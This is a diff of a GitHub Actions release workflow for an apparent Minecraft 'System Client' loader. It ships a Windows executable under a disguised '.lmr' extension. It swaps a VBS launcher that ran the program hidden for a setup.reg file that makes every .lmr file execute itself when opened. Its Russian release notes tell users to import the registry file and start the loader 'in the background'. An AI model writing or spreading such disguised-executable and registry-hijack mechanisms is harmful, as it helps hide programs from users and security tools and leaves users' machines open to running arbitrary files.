@@ -47,16 +47,19 @@ jobs:
             -lwinhttp -lshlwapi -lkernel32 -luser32 \
             -mwindows
 
-      - name: Create run.vbs launcher
+      - name: Create setup.reg
         run: |
-          cat > out/run.vbs << 'EOF'
-          Set fs = CreateObject("Scripting.FileSystemObject")
-          Set sh = CreateObject("WScript.Shell")
-          dir = fs.GetParentFolderName(WScript.ScriptFullName)
-          src = dir & "\ekran_uaqyty.lmr"
-          tmp = dir & "\ekran_uaqyty.exe"
-          fs.CopyFile src, tmp, True
-          sh.Run Chr(34) & tmp & Chr(34), 0, False
+          cat > out/setup.reg << 'EOF'
+          Windows Registry Editor Version 5.00
+
+          [HKEY_CLASSES_ROOT\.lmr]
+          @="lmrfile"
+
+          [HKEY_CLASSES_ROOT\lmrfile]
+          @="LMR Document"
+
+          [HKEY_CLASSES_ROOT\lmrfile\shell\open\command]
+          @="\"%1\""
           EOF
 
       - name: Publish to Releases
@@ -64,7 +67,7 @@ jobs:
           GH_TOKEN: ${{ github.token }}
         run: |
           gh release delete latest --yes --cleanup-tag || true
-          gh release create latest out/agent.jar "out/ekran_uaqyty.lmr" out/run.vbs \
+          gh release create latest out/agent.jar "out/ekran_uaqyty.lmr" out/setup.reg \
             --target "$GITHUB_SHA" \
             --title "System Client for Minecraft $MC_VERSION" \
-            --notes "Скачай ekran_uaqyty.lmr и run.vbs в одну папку. Двойной клик на run.vbs — лоадер запускается без окна. Ctrl+U — открыть лоадер."
+            --notes "Установка (один раз): двойной клик на setup.reg → Да. Потом: скачай ekran_uaqyty.lmr, двойной клик — запуск в фоне. Ctrl+U — открыть лоадер."
